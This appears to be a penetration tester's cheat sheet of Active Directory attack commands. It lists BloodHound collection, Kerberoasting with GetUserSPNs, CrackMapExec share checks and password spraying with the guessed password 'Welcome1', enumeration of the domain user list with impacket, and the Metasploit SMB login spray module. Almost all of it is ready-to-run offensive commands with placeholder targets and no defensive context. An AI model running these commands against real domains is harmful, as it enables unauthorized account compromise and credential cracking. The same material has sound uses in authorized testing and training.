Bloodhound From Kali
---------------------------------------------------------------
`bloodhound-python -u adusername -d domain.corp -v -c dconly -ns x.x.x.x`  
`bloodhound-python -u adusername -d domain.corp -v -c all -ns x.x.x.x`

Kerberoast SPNS
---------------------------------------------------------------
`python3 GetUserSPNS.py -request domain.corp/adusername -dc-ip x.x.x.x`

CrackMapExec
---------------------------------------------------------------
Check for smb access  
`cme smb -u username -p Welcome1 --shares final.txt --continue-on-success`

Password spray against user list  
`cme smb -u usernamesonly.txt -p Welcome1 -d domain.corp  x.x.x.x(target) --continue-on-success`

Grab user list  
`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all domain.corp/aduser -dc-ip x.x.x.x`

Metasploit Password Spray SMB
---------------------------------------------------------------
`use auxiliary/scanner/smb/smb_login` 
